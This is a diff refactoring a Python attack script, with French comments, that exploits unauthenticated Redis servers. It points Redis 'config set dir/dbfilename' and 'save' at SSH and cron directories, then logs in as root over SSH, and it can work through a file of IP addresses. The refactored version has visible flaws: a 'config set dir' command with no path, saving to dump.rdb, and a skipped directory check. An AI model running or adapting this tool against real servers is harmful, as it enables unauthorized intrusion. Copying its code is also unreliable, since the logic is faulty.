@@ -2,8 +2,9 @@
 # -*- coding: utf-8 -*-
 """
 Nom du code : Gestionnaire de serveurs Redis non authentifiés
-Description : Ce code exploite les serveurs Redis non authentifiés pour la sécurité par Zartek-creole.
-Auteur      : ZarTek-Creole (https://github.com/ZarTek-Creole)
+Description : Ce code exploite les serveurs Redis non authentifiés pour la sécurité.
+              Il cherche des répertoires vulnérables et exécute des commandes via SSH.
+Auteur      : ZarTek-Creole
 Date        : 06-12-23
 Source      :
         - https://medium.com/@Victor.Z.Zhu/redis-unauthorized-access-vulnerability-simulation-victor-zhu-ac7a71b2e419
@@ -11,6 +12,7 @@ Source      :
         - https://rioasmara.com/2023/04/07/redis-rce-post-exploitation/
         - https://medium.com/@knownsec404team/rce-exploits-of-redis-based-on-master-slave-replication-ef7a664ce1d0
 """
+
 import argparse
 import logging
 import os
@@ -20,265 +22,199 @@ from typing import List, Tuple
 
 
 class RedisConfig:
-    CLI_PATH = '/usr/bin/redis-cli'
-    CLI_PATH_ALT = '/usr/local/bin/redis-cli'
+    CLI_PATHS = ['/usr/bin/redis-cli', '/usr/local/bin/redis-cli']
     DEFAULT_PORT = '6379'
     DEFAULT_USER = 'root'
     DEFAULT_SSH_KEY = 'id_ed25519.pub'
-    DEFAULT_TIMEOUT = 30
+    DEFAULT_TIMEOUT = 5
+    VULNERABLE_DIRECTORIES = [
+        "/var/www/html", "/home/redis/.ssh", "/var/lib/redis/.ssh",
+        "/var/spool/cron/crontabs", "/var/spool/cron"
+    ]
+    REDIS_COMMANDS = [
+        'config set dbfilename backup.db',
+        'config set dir',
+        'config set dbfilename dump.rdb',
+        'save'
+    ]
 
 
 class ExitOnErrorHandler(logging.StreamHandler):
-    def emit(self, record):
+    def emit(self, record: logging.LogRecord):
+        super().emit(record)  # Permet l'affichage normal du log
         if record.levelno >= logging.ERROR:
-            super().emit(record)
             sys.exit(1)
 
 
-def configure_logging(verbose: bool):
-    """
-    Configure le système de logging.
-
-    Args:
-        verbose (bool): Si True, le niveau de logging est défini sur DEBUG, sinon sur INFO.
-    """
+def configure_logging(is_verbose: bool):
     logging.basicConfig(
         format="%(asctime)s - %(levelname)s - %(message)s",
-        level=logging.DEBUG if verbose else logging.INFO,
-        handlers=[ExitOnErrorHandler()]  # Utilisation du gestionnaire personnalisé
+        level=logging.DEBUG if is_verbose else logging.INFO,
+        handlers=[ExitOnErrorHandler()]
     )
 
 
 class RedisServerManager:
-    def __init__(self, ipAddress: str, port: str = RedisConfig.DEFAULT_PORT, user: str = RedisConfig.DEFAULT_USER, sshKey: str = RedisConfig.DEFAULT_SSH_KEY, timeout: int = RedisConfig.DEFAULT_TIMEOUT):
-        """
-        Initialise un gestionnaire de serveur Redis.
-
-        Args:
-            ipAddress (str): L'adresse IP du serveur Redis.
-            port (str): Le port Redis à utiliser (par défaut : 6379).
-            user (str): L'utilisateur SSH pour la connexion (par défaut : root).
-            sshKey (str): Le chemin vers la clé SSH (par défaut : id_rsa).
-            timeout (int): Le délai d'attente en secondes pour les commandes (par défaut : 30).
-        """
-        self.ipAddress = ipAddress
+    def __init__(
+        self,
+        ip_address: str,
+        port: str = RedisConfig.DEFAULT_PORT,
+        user: str = RedisConfig.DEFAULT_USER,
+        ssh_key: str = RedisConfig.DEFAULT_SSH_KEY,
+        timeout: int = RedisConfig.DEFAULT_TIMEOUT
+    ):
+        self.ip_address = ip_address
         self.port = port
         self.user = user
-        self.sshKey = sshKey
-        self.sshKeyPrivate = self.sshKey.rstrip('.pub')
+        self.ssh_key = ssh_key
+        self.ssh_key_private = self._derive_ssh_key_private(ssh_key)
         self.timeout = timeout
-        self.dbFilename = "authorized_keys"
-        self.directoryPath = self._determineDirectoryPath()
-        self.commands = self._generateCommands()
-        self.binaryRedis = ''
-        ssh_key_exists, ssh_key_message = self._CheckBinary()
-        if not ssh_key_exists:
-            logging.error(ssh_key_message)
+        self.directory_path = self._determine_directory_path(user)
+        self.binary_redis = self._check_binary()
 
-    def _CheckBinary(self) -> tuple[bool, str]:
-        """
-        Vérifie la disponibilité d'un binaire spécifié et, éventuellement, d'un client SSH.
+    @staticmethod
+    def _derive_ssh_key_private(ssh_key: str) -> str:
+        return ssh_key.rstrip('.pub')
 
-        Args:
-            binaryPath (str): Le chemin vers le binaire à vérifier.
-            sshKey (str, optionnel): Le chemin vers la clé SSH (si nécessaire).
+    @staticmethod
+    def _determine_directory_path(user: str) -> str:
+        return '/root/.ssh/' if user == "root" else f'/home/{user}/.ssh/'
 
-        Returns:
-            tuple[bool, str]: Un tuple contenant True si le binaire et, le cas échéant, le binaire SSH existent,
-                            et une chaîne de caractères (msg) décrivant le résultat.
-        """
-        sshKey_exists = os.path.isfile(self.sshKey)
-        if not sshKey_exists:
-            return False, f"La clé public SSH '{self.sshKey}' n'existe pas. Assurez-vous d'avoir fourni le bon chemin. pour generer une clé ssh : ssh-keygen -t ed25519 -f ./id_ed25519 -N ''"
-        sshKeyPrivate_exists = os.path.isfile(self.sshKeyPrivate)
-        if not sshKeyPrivate_exists:
-            return False, f"La clé privée SSH '{self.sshKeyPrivate}' n'existe pas. Assurez-vous d'avoir fourni le bon chemin. pour generer une clé ssh : ssh-keygen -t ed25519 -f ./id_ed25519 -N ''"
+    def _check_binary(self) -> str:
+        self._validate_ssh_keys()
+        self._validate_ssh_client()
+        return self._find_redis_cli()
 
+    def _validate_ssh_keys(self):
+        if not os.path.isfile(self.ssh_key) or not os.path.isfile(self.ssh_key_private):
+            logging.error("Les clés SSH spécifiées n'existent pas.")
+            raise FileNotFoundError(f"Les clés SSH '{self.ssh_key}' et '{self.ssh_key_private}' n'existent pas.")
+
+    @staticmethod
+    def _validate_ssh_client():
         try:
             subprocess.run(["ssh", "-V"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
         except subprocess.CalledProcessError:
-            return False, "Le client SSH n'est pas installé sur votre système. Assurez-vous d'avoir installé un client SSH compatible. (apt install openssh-client)"
-        if os.path.isfile(RedisConfig.CLI_PATH):
-            self.binaryRedis = RedisConfig.CLI_PATH
-        elif os.path.isfile(RedisConfig.CLI_PATH_ALT):
-            self.binaryRedis = RedisConfig.CLI_PATH_ALT
-        else:
-            return False, "Le client Redis n'est pas installé sur votre système. Assurez-vous d'avoir installé un client Redis compatible. (apt install redis-tools)"
-        return True, "Tout est bon."
+            logging.error("Le client SSH n'est pas installé.")
+            raise EnvironmentError("Le client SSH n'est pas installé. Veuillez installer un client SSH (ex. : 'apt install openssh-client').")
 
-    def _determineDirectoryPath(self) -> str:
-        """
-        Détermine le chemin du répertoire .ssh en fonction de l'utilisateur.
+    def _find_redis_cli(self) -> str:
+        for path in RedisConfig.CLI_PATHS:
+            if os.path.isfile(path):
+                return path
+        logging.error("Le client Redis n'est pas installé.")
+        raise EnvironmentError("Le client Redis n'est pas installé. Veuillez installer un client Redis (ex. : 'apt install redis-tools').")
 
-        Returns:
-            str: Le chemin du répertoire .ssh.
-        """
-        return f'/home/{self.user}/.ssh/' if self.user != "root" else '/root/.ssh/'
+    def process_server(self) -> Tuple[bool, str]:
+        logging.info(
+            f"Tentative de connexion à {self.ip_address}:{self.port} avec l'utilisateur {self.user} et la clé SSH '{self.ssh_key}' "
+            f"(timeout {self.timeout} sec) écriture dans {self.directory_path}"
+        )
+        success, msg = self._find_vulnerable_directory()
+        logging.debug(f"Répertoire vulnérable trouvé : {self.directory_path}" if success else msg)
+        # if not success:
+        #     return False, msg
+        return self._execute_redis_commands()
 
-    def _generateCommands(self) -> List[List[str]]:
-        """
-        Génère les commandes Redis nécessaires.
-
-        Returns:
-            List[List[str]]: Une liste de listes contenant les commandes Redis.
-        """
-        return [
-            [self.binaryRedis, '-h', self.ipAddress, '-p', self.port, 'config', 'set', 'dbfilename', 'backup.db'],
-            [self.binaryRedis, '-h', self.ipAddress, '-p', self.port, 'config', 'set', 'dir', self.directoryPath],
-            [self.binaryRedis, '-h', self.ipAddress, '-p', self.port, 'config', 'set', 'dbfilename', self.dbFilename],
-            [self.binaryRedis, '-h', self.ipAddress, '-p', self.port, 'save']
-        ]
-
-    def processServer(self) -> Tuple[bool, str]:
-        """
-        Exécute le processus de gestion du serveur Redis.
-
-        Returns:
-            Tuple[bool, str]: Un tuple contenant un booléen (True si réussi, False sinon) et un message.
-        """
-        logging.info(f"Tentative sur {self.ipAddress}:{self.port} avec {self.user} et la clé SSH '{self.sshKey}' (timeout {self.timeout} sec) écriture dans {self.directoryPath}{self.dbFilename}")
-        success, msg = self._findVulnerableDirectory()
-        if not success:
-            return False, msg
-        for command in self.commands:
-            success, message = self._executeCommand(command)
-            if not success:
-                return False, message
-        return self._executeSSHCommand()
-
-    def _findVulnerableDirectory(self) -> Tuple[bool, str]:
-        """
-        Trouve un répertoire vulnérable pour Redis.
-
-        Returns:
-            Tuple[bool, str]: Un tuple contenant un booléen (True si réussi, False sinon) et un message.
-        """
-        for dname in [
-            "/var/www/html",
-            "/home/redis/.ssh",
-            "/var/lib/redis/.ssh",
-            "/var/spool/cron/crontabs",
-            "/var/spool/cron",
-        ]:
-
-            command = [self.binaryRedis, '-h', self.ipAddress, '-p', self.port, 'config', 'set', 'dir', dname]
-            success, _ = self._executeCommand(command)
-            if success:
-                self.directoryPath = dname
-                return True, dname
+    def _find_vulnerable_directory(self) -> Tuple[bool, str]:
+        for directory in RedisConfig.VULNERABLE_DIRECTORIES:
+            if self._test_directory(directory):
+                self.directory_path = directory
+                return True, f"Répertoire vulnérable trouvé : {directory}"
         return False, "Aucun répertoire vulnérable trouvé."
 
-    def _executeCommand(self, command: List[str]) -> Tuple[bool, str]:
-        """
-        Exécute une commande shell.
+    def _test_directory(self, directory: str) -> bool:
+        command = [self.binary_redis, '-h', self.ip_address, '-p', self.port, 'config', 'set', 'dir', directory]
+        success, _ = self._execute_command(command)
+        return success
 
-        Args:
-            command (List[str]): La commande à exécuter sous forme de liste de chaînes.
+    def _execute_redis_commands(self) -> Tuple[bool, str]:
+        for cmd in RedisConfig.REDIS_COMMANDS:
+            command = [self.binary_redis, '-h', self.ip_address, '-p', str(self.port)] + cmd.split()
+            logging.debug(f"Commande Redis _execute_redis_commands : {command}")
+            success, message = self._execute_command(command)
+            if not success:
+                return False, message
+        return self._execute_ssh_command()
 
-        Returns:
-            Tuple[bool, str]: Un tuple contenant un booléen (True si réussi, False sinon) et un message.
-        """
-
+    def _execute_command(self, command: List[str]) -> Tuple[bool, str]:
+        logging.debug(f"Commande Redis _execute_command : {command}")
         try:
             result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=self.timeout, text=True)
-            return self._checkRedisResult(result, command)
+            logging.debug(f"Résultat de la commande Redis _execute_command : {result}")
+            return self._check_redis_result(result)
+
         except subprocess.TimeoutExpired:
-            return False, f"La commande a expiré après {self.timeout} secondes."
+            return False, f"Le délai de la commande a expiré après {self.timeout} secondes."
         except Exception as e:
             return False, f"Erreur : {str(e)}"
 
-    def _checkRedisResult(self, result: subprocess.CompletedProcess, command: List[str]) -> Tuple[bool, str]:
-        """
-        Vérifie le résultat de l'exécution d'une commande Redis.
-
-        Args:
-            result (subprocess.CompletedProcess): Le résultat de l'exécution de la commande.
-            command (List[str]): La commande qui a été exécutée.
-
-        Returns:
-            Tuple[bool, str]: Un tuple contenant un booléen (True si réussi, False sinon) et un message.
-        """
-        error_msg = result.stderr.strip()
-        result_msg = result.stdout.strip()
-        return_code = result.returncode
-
-        if "NOAUTH Authentication required" in result_msg:
-            return False, "Authentification requise."
-        elif "Server closed the connection" in error_msg or "Connection reset by peer" in error_msg:
-            return False, "Connexion interrompue."
-        elif return_code != 0:
-            return False, "Erreur inconnue."
+    def _check_redis_result(self, result: subprocess.CompletedProcess) -> Tuple[bool, str]:
+        if result.returncode != 0:
+            return False, result.stderr.strip()
         return True, "Commande exécutée avec succès."
 
-    def _executeSSHCommand(self) -> Tuple[bool, str]:
-        """
-        Exécute la commande SSH pour se connecter au serveur.
-
-        Returns:
-            Tuple[bool, str]: Un tuple contenant un booléen (True si réussi, False sinon) et un message.
-        """
-        sshCommand = f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout={self.timeout} -o PasswordAuthentication=no -i {self.sshKey} {self.user}@{self.ipAddress}"
+    def _execute_ssh_command(self) -> Tuple[bool, str]:
+        ssh_command = self._build_ssh_command()
+        logging.debug(f"Commande SSH : {ssh_command}")
         try:
-            os.system(sshCommand)
-            return True, "Commande SSH exécutée."
+            result = subprocess.run(ssh_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=self.timeout)
+            if result.returncode == 0:
+                return True, "Commande SSH exécutée avec succès."
+            else:
+                return False, f"Échec de la commande SSH : {result.stderr.decode().strip()}"
+        except subprocess.TimeoutExpired:
+            return False, "Le délai d'exécution de la commande SSH a expiré."
         except Exception as e:
             return False, f"Erreur de connexion SSH : {str(e)}"
 
-
-def processFile(filePath: str, port: str, user: str, sshKey: str, timeout: int):
-    """
-    Traite un fichier contenant des adresses IP de serveurs Redis.
-
-    Args:
-        filePath (str): Le chemin du fichier contenant les adresses IP.
-        port (str): Le port Redis à utiliser.
-        user (str): L'utilisateur SSH pour la connexion.
-        sshKey (str): Le chemin vers la clé SSH.
-        timeout (int): Le délai d'attente en secondes pour les commandes.
-    """
-    with open(filePath, "r") as file:
-        for ipAddress in file:
-            ipAddress = ipAddress.strip()
-            if ipAddress:
-                manager = RedisServerManager(ipAddress, port, user, sshKey, timeout)
-                manager.processServer()
+    def _build_ssh_command(self) -> str:
+        return f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout={self.timeout} -o PasswordAuthentication=no -i {self.ssh_key} {self.user}@{self.ip_address}"
 
 
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(
-        description="Gestionnaire de serveurs Redis non authentifiés",
-        formatter_class=argparse.ArgumentDefaultsHelpFormatter
-    )
+def process_file(file_path: str, port: str, user: str, ssh_key: str, timeout: int):
+    with open(file_path, "r") as file:
+        for ip_address in file:
+            ip_address = ip_address.strip()
+            if ip_address:
+                manager = RedisServerManager(ip_address, port, user, ssh_key, timeout)
+                success, message = manager.process_server()
+                logging.info(f"IP {ip_address} - Résultat : {success}, Message : {message}")
 
-    parser.add_argument('--ip', help="Adresse IP du serveur Redis")
-    parser.add_argument('-f', '--file', help="Chemin vers le fichier contenant les adresses IP")
 
-    parser.add_argument('--port', type=int, default=RedisConfig.DEFAULT_PORT, help="Port du serveur Redis")
-    parser.add_argument('--user', default=RedisConfig.DEFAULT_USER, help="Utilisateur pour la connexion Redis")
-    parser.add_argument('--sshKey', default=RedisConfig.DEFAULT_SSH_KEY, help="Chemin vers le fichier de clé SSH")
-    parser.add_argument('--timeout', type=int, default=RedisConfig.DEFAULT_TIMEOUT, help="Timeout pour la connexion")
-    parser.add_argument('-v', '--verbose', action='store_true', help="Augmente la verbosité des logs")
-
+def parse_arguments() -> argparse.Namespace:
+    parser = argparse.ArgumentParser(description="Gestionnaire de serveurs Redis non authentifiés", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
+    parser.add_argument('-i', '--ip', help="Adresse IP du serveur Redis")
+    parser.add_argument('-f', '--file', help="Chemin du fichier contenant les adresses IP")
+    parser.add_argument('-p', '--port', type=int, default=RedisConfig.DEFAULT_PORT, help="Port du serveur Redis")
+    parser.add_argument('-u', '--user', default=RedisConfig.DEFAULT_USER, help="Utilisateur SSH pour la connexion")
+    parser.add_argument('-s', '--sshKey', default=RedisConfig.DEFAULT_SSH_KEY, help="Chemin du fichier de clé SSH")
+    parser.add_argument('-t', '--timeout', type=int, default=RedisConfig.DEFAULT_TIMEOUT, help="Délai de connexion")
+    parser.add_argument('-v', '--verbose', action='store_true', help="Augmenter la verbosité des logs")
     args = parser.parse_args()
 
-    # Configuration du logging
+    if not (args.ip or args.file):
+        parser.print_help()
+        sys.exit(1)
+
+    return args
+
+
+def main():
+    args = parse_arguments()
     configure_logging(args.verbose)
-
-    # Utilisation des valeurs fournies par l'utilisateur ou des valeurs par défaut
-    ip_address = args.ip
-    file_path = args.file
-    port = args.port
-    user = args.user
-    sshKey = args.sshKey
-    timeout = args.timeout
-
-    if not (ip_address or file_path):
+    if not (args.ip or args.file):
         logging.warning("Aucune adresse IP ou chemin de fichier spécifié. "
                         "Utilisez l'option '--ip' pour spécifier une adresse IP ou "
                         "'-f' pour spécifier un fichier contenant des adresses IP. "
                         "Utilisez '--help' pour plus d'informations.")
-    elif ip_address:
-        manager = RedisServerManager(ip_address, args.port, args.user, args.sshKey, args.timeout)
-        manager.processServer()
+    elif args.ip:
+        manager = RedisServerManager(args.ip, args.port, args.user, args.sshKey, args.timeout)
+        success, message = manager.process_server()
+        logging.info(f"IP {args.ip} - Résultat : {success}, Message : {message}")
     else:
-        processFile(file_path, args.port, args.user, args.sshKey, args.timeout)
+        process_file(args.file, args.port, args.user, args.sshKey, args.timeout)
+
+
+if __name__ == "__main__":
+    main()
